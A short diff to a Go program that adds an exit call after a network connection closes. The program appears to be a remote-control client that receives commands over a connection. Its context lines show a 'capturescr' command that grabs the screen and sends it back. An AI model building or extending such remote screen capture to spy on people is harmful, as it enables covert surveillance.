@@ -30,6 +30,7 @@ func main() {
 		if cmd == "q" || cmd == "quit" || cmd == "exit" {
 			send_msg(conn, "Connection closing :|")
 			conn.Close()
+			os.Exit(0)
 		} else if cmd == "capturescr" {
 			result := "img:" + capture_scr()
 			send_msg(conn, result)
